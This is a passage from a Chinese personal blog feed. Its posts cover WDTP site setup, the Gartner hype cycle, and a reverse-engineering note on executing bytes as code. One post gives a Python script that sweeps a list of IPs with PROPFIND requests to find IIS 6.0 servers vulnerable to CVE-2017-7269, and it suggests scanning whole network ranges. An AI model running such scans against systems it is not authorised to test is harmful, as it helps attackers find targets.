init</div><div class="line">git add .</div><div class="line">git commit //命令给文件一个仓库标记，做为仓库历史，便于以后在远程端查找</div><div class="line">git remote add origin git@github.com:username/username.github.io.git</div></pre></td></tr></table></figure></p>
<p>git@github.com:username/username.github.io.git的是你的git远端地址，至于为什么用这个是因为ssh创建公钥之后不用重复输入密码<br><strong>注: </strong><a href="https://coding.net/help/doc/account/ssh-key.html" target="_blank" rel="external">如何生成ssh公钥</a>这篇文章是以coding.net为例，不过你生成的id_rsa.pub内容同时也可以添加到github，基本相同的步骤，如果有什么疑问可以百度一下关键词为<code>github ssh公钥 配置</code></p>
<h3 id="添加评论功能"><a href="#添加评论功能" class="headerlink" title="添加评论功能"></a>添加评论功能</h3><ul>
<li>如果你不愿意麻烦可以使用邮箱来收集评论<br>打开qq邮箱点击上方<strong>设置-&gt;账户-&gt;邮我-&gt;使用邮我</strong><br>然后获取代码<br><img src="https://ooo.0o0.ooo/2017/04/01/58df97595ea80.png" alt="snipaste_20170401_200420.png"><br>复制<code>&lt;a target=&quot;_blank&quot; href=&quot;http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=64qAgJ6GioWYq5qaxYiEhg&quot; style=&quot;text-decoration:none;&quot;&gt;</code><br>然后打开你的项目文件夹/themes/blog/article.html，把相应的地方改为下面例子这样<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">page_navi</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">href</span>=<span class="string">"http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=64qAgJ6GioWYq5qaxYiEhg"</span> <span class="attr">style</span>=<span class="string">"text-decoration:none;"</span>&gt;</span>评论/咨询/讨论/留言<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
</li>
</ul>
<p>然后别人点击评论就可以打开给你发邮件的入口</p>
<ul>
<li>如果你想添加社会化评论系统<br>鉴于多说即将关闭，国内没被墙的无需北岸的第三方评论已经很少了，这里我用<a href="https://livere.com" target="_blank" rel="external">来必力</a>做例子</li>
</ul>
<ol>
<li>注册登录(如果chrome浏览器注册之后一直登录不了请使用火狐)</li>
<li>点击顶栏安装，然后填好相关信息获取代码<br><img src="https://ooo.0o0.ooo/2017/04/01/58df9a0fc3eb5.png" alt="snipaste_20170401_201601.png"></li>
<li><p>然后打开你的项目文件夹/themes/blog/article.html，把原先的评论代码删除掉，在合适的地方插入上方代码，我插入完之后的article.html例子如下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!doctype html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"Generator"</span> <span class="attr">content</span>=<span class="string">"WDTP by UnderwaySoft"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"Author"</span> <span class="attr">content</span>=<span class="string">"&#123;&#123;author&#125;&#125;"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"Keywords"</span> <span class="attr">content</span>=<span class="string">"&#123;&#123;keywords&#125;&#125;"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"Description"</span> <span class="attr">content</span>=<span class="string">"&#123;&#123;description&#125;&#125;"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"&#123;&#123;siteRelativeRootPath&#125;&#125;add-in/style.css"</span>/&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;title&#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span> </div><div class="line">  &#123;&#123;siteLogo&#125;&#125;</div><div class="line">  &#123;&#123;siteMenu&#125;&#125;</div><div class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></div><div class="line">  &#123;&#123;siteNavi&#125;&#125;</div><div class="line">  &#123;&#123;content&#125;&#125;</div><div class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></div><div class="line">  &#123;&#123;createAndModifyTime&#125;&#125;</div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span><span class="tag">&lt;<span class="name">h5</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"background:PowderBlue"</span>&gt;</span></div><div class="line">	    本文版权：&#123;&#123;siteLink&#125;&#125; &amp;emsp;</div><div class="line">		共享协议：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'http://creativecommons.org/licenses/by-nc-nd/2.5/deed.zh'</span> <span class="attr">target</span>=<span class="string">'_blank'</span>&gt;</span>署名-非商业使用-禁止演绎<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h5</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></div><div class="line">  &#123;&#123;previousAndNext&#125;&#125;</div><div class="line"></div><div class="line">  &#123;&#123;ad&#125;&#125;</div><div class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></div><div class="line">  &#123;&#123;random&#125;&#125;</div><div class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></div><div class="line">	<span class="comment">&lt;!-- 来必力City版安装代码 --&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"lv-container"</span> <span class="attr">data-id</span>=<span class="string">"city"</span> <span class="attr">data-uid</span>=<span class="string">"MTAyMC8yODAwMC80NTc3"</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></div><div class="line">			(function(d, s) &#123;</div><div class="line">				var j, e = d.getElementsByTagName(s)[0];</div><div class="line"></div><div class="line">				if (typeof LivereTower === 'function') &#123; return; &#125;</div><div class="line"></div><div class="line">				j = d.createElement(s);</div><div class="line">				j.src = 'https://cdn-city.livere.com/js/embed.dist.js';</div><div class="line">				j.async = true;</div><div class="line"></div><div class="line">				e.parentNode.insertBefore(j, e);</div><div class="line">			&#125;)(document, 'script');</div><div class="line">		<span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">noscript</span>&gt;</span> 为正常使用来必力评论功能请激活JavaScript<span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">	<span class="comment">&lt;!-- City版安装代码已完成 --&gt;</span></div><div class="line">  &#123;&#123;contact&#125;&#125;</div><div class="line">  &#123;&#123;bottomCopyright&#125;&#125;</div><div class="line"></div><div class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
</li>
<li><p>最后的效果如图<br><img src="https://ooo.0o0.ooo/2017/04/01/58df9adb69d5f.png" alt="snipaste_20170401_201926.png"></p>
</li>
</ol>
<h3 id="最后要说的"><a href="#最后要说的" class="headerlink" title="最后要说的"></a>最后要说的</h3><p>这个工具确实是十分方便的，如果你作为笔记，可以使用坚果云来同步，同时它可以打包你的数据，多说无益，试用之后你会感受到它的强大</p>
<p><strong>本文部分转自<a href="http://underwaysoft.com/works/wdtp/download.html" target="_blank" rel="external">Underwaysoft</a></strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;WDTP（山湖录）不止是一款开源免费的GUI桌面单机版静态网站生成器和简单方便的前端开发工具，更是一款跨平台的集笔记、录音、个人知识管理、写作/创作、博客/网站内容与样式管理等功能于一体的多合一内容处理/管理器，同时还是一款高度追求用户体验的Markdown文本编辑器和一款方便强大的录音机。本软件研发的核心思想是：&lt;strong&gt;简洁高效、轻灵优雅、先进强悍、操作简单&lt;/strong&gt;。&lt;/p&gt;
    
    </summary>
    
      <category term="推荐向" scheme="http://akkuman.coding.me/categories/%E6%8E%A8%E8%8D%90%E5%90%91/"/>
    
    
      <category term="推荐向" scheme="http://akkuman.coding.me/tags/%E6%8E%A8%E8%8D%90%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>iis6-0 cve-2017-7269 批量验证脚本</title>
    <link href="http://akkuman.coding.me/2017/04/01/iis6-0-cve-2017-7269.html"/>
    <id>http://akkuman.coding.me/2017/04/01/iis6-0-cve-2017-7269.html</id>
    <published>2017-04-01T04:44:52.000Z</published>
    <updated>2017-04-01T04:58:00.640Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://gist.githubusercontent.com/iam1980/62ee37e38c7f76ca5d3889379e1d81fd/raw/aed9a3ef42bc6e6592913c5df8906ca6c57c9c66/getpro.py" target="_blank" rel="external">代码地址</a></p>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"></div><div class="line">f = open(<span class="string">'ips.txt'</span>, <span class="string">'r'</span>)</div><div class="line">flines = f.readlines()</div><div class="line"></div><div class="line">vulnsrvs = <span class="number">0</span></div><div class="line">i = <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> flines:</div><div class="line"></div><div class="line">    host = line.split(<span class="string">":"</span>)</div><div class="line"></div><div class="line">    ip = host[<span class="number">0</span>].replace(<span class="string">'\n'</span>,<span class="string">''</span>)</div><div class="line">    port = host[<span class="number">1</span>].replace(<span class="string">'\n'</span>,<span class="string">''</span>)</div><div class="line"></div><div class="line">    <span class="keyword">print</span> <span class="string">"Try ("</span> + str(i) +<span class="string">") "</span>+ str(ip) +<span class="string">":"</span> + str(port)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> port == <span class="string">"443"</span>:</div><div class="line">        <span class="comment">#dont bother with SSL/TLS</span></div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        myout =  subprocess.check_output([<span class="string">'curl'</span>, <span class="string">'--connect-timeout'</span>, <span class="string">'2'</span>, <span class="string">'--max-time'</span>, <span class="string">'2'</span>, <span class="string">'-s'</span>,<span class="string">'-I'</span>, <span class="string">'-X'</span>, <span class="string">'PROPFIND'</span>,<span class="string">'http://'</span> + ip  + <span class="string">':'</span> + port + <span class="string">'/'</span> ])</div><div class="line">        <span class="keyword">print</span> myout</div><div class="line">        <span class="keyword">if</span> <span class="string">"HTTP/1.1 411 Length Required"</span> <span class="keyword">in</span> myout:</div><div class="line">            <span class="keyword">print</span> <span class="string">"Found one:"</span></div><div class="line">            <span class="keyword">print</span> myout</div><div class="line">            vulnsrvs += <span class="number">1</span></div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        <span class="keyword">print</span> str(e.output)</div><div class="line">    i += <span class="number">1</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"Vulnerable: "</span> + str(vulnsrvs)</div></pre></td></tr></table></figure>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>ips.txt 是待验证的列表格式为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">129.112.44.1:80</div><div class="line">129.112.44.2:81</div><div class="line">129.112.44.43:8808</div></pre></td></tr></table></figure></p>
<p>它不检测443端口（HTTPS）<br>你也可以简单改一下进行网段批量验证。</p>
<p>转自群友<a href="http://www.loner.fm/article.php?id=24251" target="_blank" rel="external">CF_HB</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://gist.githubusercontent.com/iam1980/62ee37e38c7f76ca5d3889379e1d81fd/raw/aed9a3ef42bc6e6592913c5df8906ca6c57c9c66/getpro.py&quot;&gt;代码地址&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Tools" scheme="http://akkuman.coding.me/categories/Tools/"/>
    
    
      <category term="Hacker" scheme="http://akkuman.coding.me/tags/Hacker/"/>
    
      <category term="Tools" scheme="http://akkuman.coding.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>推荐一个十分好看的开源博客系统</title>
    <link href="http://akkuman.coding.me/2017/03/12/a-beautiful-open-source-blog-lcm.html"/>
    <id>http://akkuman.coding.me/2017/03/12/a-beautiful-open-source-blog-lcm.html</id>
    <published>2017-03-12T12:22:35.000Z</published>
    <updated>2017-03-12T12:25:58.841Z</updated>
    
    <content type="html"><![CDATA[<p>推荐一个十分好看的开源博客系统，直接百度“里程密”地址<a href="http://www.lcm.wang/" target="_blank" rel="external">www.lcm.wang</a></p>
<p>附图</p>
<p>主页</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c53df6b41cf.png" alt="snipaste_20170312_202041.png"></p>
<p>后台</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c53e0b65eaa.png" alt="snipaste_20170312_201924.png"></p>
<p>浓浓的科技简约风，适合做技术的你</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;推荐一个十分好看的开源博客系统，直接百度“里程密”地址&lt;a href=&quot;http://www.lcm.wang/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;www.lcm.wang&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;附图&lt;/p&gt;
&lt;p&gt;主页&lt;/p&gt;
&lt;p&gt;&lt;img
    
    </summary>
    
      <category term="life" scheme="http://akkuman.coding.me/categories/life/"/>
    
    
      <category term="life" scheme="http://akkuman.coding.me/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>技术的热门度曲线</title>
    <link href="http://akkuman.coding.me/2017/03/12/technology-s-popularity-curve.html"/>
    <id>http://akkuman.coding.me/2017/03/12/technology-s-popularity-curve.html</id>
    <published>2017-03-12T05:34:01.000Z</published>
    <updated>2017-03-12T05:44:27.345Z</updated>
    
    <content type="html"><![CDATA[<p>全球最大的 IT 咨询公司<a href="http://baike.baidu.com/item/Gartner" target="_blank" rel="external">高德纳</a>（Gartner），有一个”<a href="http://www.gartner.com/technology/research/methodologies/hype-cycle.jsp" target="_blank" rel="external">技术热门度曲线</a>“模型（Gartner Hype Cycle）。</p>
<p>该模型认为，一门技术的发展要经历五个阶段。</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c4de8267e76.png" alt="bg2017030301.png"><br><a id="more"></a></p>
<ol>
<li><p><strong>启动期（Innovation Trigger）</strong><br>该技术刚刚诞生，还只是一个概念，不具有可用性，无法评估商业潜力。媒体有所报道，引起了外界的兴趣。</p>
</li>
<li><p><strong>泡沫期（Peak of Inflated Expectations）</strong><br>该技术逐步成型，出现了个别成功的案例，一些激进的公司开始跟进。媒体开始大肆报导，伴有各种非理性的渲染，产品的知名度达到高峰。</p>
</li>
<li><p><strong>低谷期（Trough of Disillusionment）</strong><br>该技术的局限和缺点逐步暴露，对它的兴趣开始减弱。基于它的产品，大部分被市场淘汰或者失败，只有那些找到早期用户的公司艰难地活了下来。媒体对它的报道逐步冷却，前景不明。</p>
</li>
<li><p><strong>爬升期（Slope of Enlightenment）</strong><br>该技术的优缺点越来越明显，细节逐渐清晰，越来越多的人开始理解它。基于它的第二代和第三代产品出现，更多的企业开始尝试，可复制的成功使用模式出现。媒体重新认识它，业界这一次给予了高度的理性的关注。</p>
</li>
<li><p><strong>高原期（Plateau of Productivity）</strong><br>经过不断发展，该技术慢慢成为了主流。技术标准得到了清晰定义，使用起来越发方便好用，市场占有率越来越高，进入稳定应用阶段。配合它的工具和最佳实践，经过数代的演进，也变得非常成熟了。业界对它有了公认的一致的评价。</p>
</li>
</ol>
<p>该模型的细节可以查看维基百科的<a href="https://en.wikipedia.org/wiki/Hype_cycle#/media/File:Hype-Cycle-General.png" target="_blank" rel="external">大图</a>。</p>
<p>高德纳公司每年都会公布，当年的热门技术图。下面就是去年七月的图。</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c4df3436d4e.png" alt="bg2017030302.png"></p>
<p>上图中，4D打印处于”启动期”，区块链处于”泡沫期”，增强现实处于”低谷期”，虚拟现实处于爬升期。</p>
<p>本周，有人进行数据分析后，建立了一个名叫 <a href="https://stateofdev.com/" target="_blank" rel="external">State.of.Dev</a> 的网站，提供各种技术的热门程度图。</p>
<p>下图是编程语言。</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c4df61bd060.png" alt="bg2017030303.png"></p>
<p>上图中，Rust 语言处于启动期，Go 语言处于泡沫期，Ruby 语言处于低谷期，Object-C 处于爬升期，PHP 和 Java 处于高原期。</p>
<p>下图是 Web 技术。</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c4df7a78ea1.png" alt="bg2017030305.png"></p>
<p>上图中，WebAssembly 处于启动期，WebRTC 处于低谷期，HTTPS 处于高原期。</p>
<p>一门技术到底前景如何，很难预测，但是它的热门程度却是可以衡量的（比如在社交媒体提及次数的增长幅度）。风险投资跟热门程度高度正相关，越热门的技术越容易拿到投资。</p>
<p>用户可以采用这张图，判断技术处在哪一个阶段，确定它的热门程度。简单的使用规则如下。</p>
<blockquote>
<p><strong>“争取风险投资，要选择热门的技术；解决实际问题， 要选择可靠的技术。”</strong></p>
</blockquote>
<p>简单说，处于启动期的技术，风险很大，不确定性极高，但是一旦成功，回报可能也很高，适合创业公司；处于高原期的技术，非常可靠，风险低，有成熟的解决方案和配套工具，适合大公司和企业的内部应用。</p>
<p>反过来说，如果一门技术处于高原期了，就代表它非常成熟了，人们对它能干什么和不能干什么，都已经很了解了，也没有新的期待了，技术本身的潜力已经不大了，所以用它拿不到投资，只能用来干活。</p>
<p>（完）</p>
<p><strong>转载自<a href="http://www.ruanyifeng.com/blog/2017/03/gartner-hype-cycle.html" target="_blank" rel="external">阮一峰的网络日志</a></strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;全球最大的 IT 咨询公司&lt;a href=&quot;http://baike.baidu.com/item/Gartner&quot;&gt;高德纳&lt;/a&gt;（Gartner），有一个”&lt;a href=&quot;http://www.gartner.com/technology/research/methodologies/hype-cycle.jsp&quot;&gt;技术热门度曲线&lt;/a&gt;“模型（Gartner Hype Cycle）。&lt;/p&gt;
&lt;p&gt;该模型认为，一门技术的发展要经历五个阶段。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ooo.0o0.ooo/2017/03/12/58c4de8267e76.png&quot; alt=&quot;bg2017030301.png&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="life" scheme="http://akkuman.coding.me/categories/life/"/>
    
    
      <category term="life" scheme="http://akkuman.coding.me/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>逆向学习笔记（2）-这是代码还是数据</title>
    <link href="http://akkuman.coding.me/2017/03/10/reverse-engineering-study-note-2-is-this-code-or-data.html"/>
    <id>http://akkuman.coding.me/2017/03/10/reverse-engineering-study-note-2-is-this-code-or-data.html</id>
    <published>2017-03-10T15:38:22.000Z</published>
    <updated>2017-03-10T15:56:28.723Z</updated>
    
    <content type="html"><![CDATA[<p><strong>以下的ide为CodeBlocks，编译器采用的GCC，系统为win10 64bit,在不同编译器和环境下汇编代码可能不同</strong><br><a id="more"></a></p>
<h1 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getmin</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>(a&gt;b)</div><div class="line">		<span class="keyword">return</span> b;</div><div class="line">	<span class="keyword">else</span></div><div class="line">		<span class="keyword">return</span> a;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*pfunction)</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> a=<span class="number">456789</span>,b=<span class="number">123789</span>,c=<span class="number">0</span>;</div><div class="line">    pfunction pGetmin = (pfunction)getmin;</div><div class="line">	</div><div class="line">    c = pGetmin(a, b);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,c);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上面这段代码是比大小输出小的，<code>typedef int (*pfunction)(int, int);</code>定义了一个函数指针，但是下面这段代码和上面的功能是完全一样的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*pfunction)</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> a=<span class="number">456789</span>,b=<span class="number">123789</span>,c=<span class="number">0</span>;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> loc[] =</div><div class="line">    &#123;</div><div class="line">        <span class="number">0x55</span>, <span class="number">0x89</span>, <span class="number">0xE5</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0x3B</span>, <span class="number">0x45</span>, <span class="number">0x0C</span>, <span class="number">0x7E</span>, <span class="number">0x05</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x0C</span>, <span class="number">0xEB</span>, <span class="number">0x03</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0x5D</span>, <span class="number">0xC3</span></div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    pfunction getmin = (pfunction)&amp;loc;</div><div class="line">    c = getmin(a, b);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,c);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h1><p>当<code>c = pGetmin(a, b);</code>调用pGetmin的时候，在汇编中是先call跳到一个地址然后从那个地址再jmp到函数入口地址然后开始执行函数<br>getmin函数整体汇编为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">push   ebp</div><div class="line">mov    ebp,esp</div><div class="line">mov    eax,DWORD PTR [ebp+0x8]</div><div class="line">cmp    eax,DWORD PTR [ebp+0xc]</div><div class="line">jle    &lt;getmin+16&gt;</div><div class="line">mov    eax,DWORD PTR [ebp+0xc]</div><div class="line">jmp    &lt;getmin+19&gt;</div><div class="line">mov    eax,DWORD PTR [ebp+0x8]</div><div class="line">pop    ebp</div><div class="line">ret</div></pre></td></tr></table></figure></p>
<p>通过一些调试程序（发现CodeBlocks带的汇编调试没有vc6好用，看不到硬编码）可以得出这段汇编代码在硬编码中的值为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x55, 0x89, 0xE5, 0x8B, 0x45, 0x08, 0x3B, 0x45, 0x0C, 0x7E, 0x05, 0x8B, 0x45, 0x0C, 0xEB, 0x03, 0x8B, 0x45, 0x08, 0x5D, 0xC3</div></pre></td></tr></table></figure></p>
<p>这段数据我们在第二个代码中把它存入了一个char类型的数组，它虽然在数据区，但是它还是可以看作可运行的一段函数代码，我们依旧定义一个函数指针指向这个char类型数组的入口地址，达到了和第一种相同的效果<br>在编程中，我们是把代码和数据分得很开的，但是在逆向和汇编中，这个区别就不明显了，在计算机中都是以数据形式存在的，你可以说它是一串数据，也可以说它是代码</p>
<p><strong><em>转载请注明出处</em></strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;以下的ide为CodeBlocks，编译器采用的GCC，系统为win10 64bit,在不同编译器和环境下汇编代码可能不同&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://akkuman.coding.me/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://akkuman.coding.me/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>逆向学习笔记（1）-为什么代码不停地循环运行</title>
    <link href="http://akkuman.coding.me/2017/03/09/reverse-engineering-study-note-1-why-does-code-keep-running.html"/>
    <id>http://akkuman.coding.me/2017/03/09/reverse-engineering-study-note-1-why-does-code-keep-running.html</id>
    <published>2017-03-09T08:33:07.000Z</published>
    <updated>2017-03-09T09:45:45.162Z</updated>
    
    <content type="html"><![CDATA[<p>对于下面这段c语言代码会一直不停地循环，为什么呢？</p>
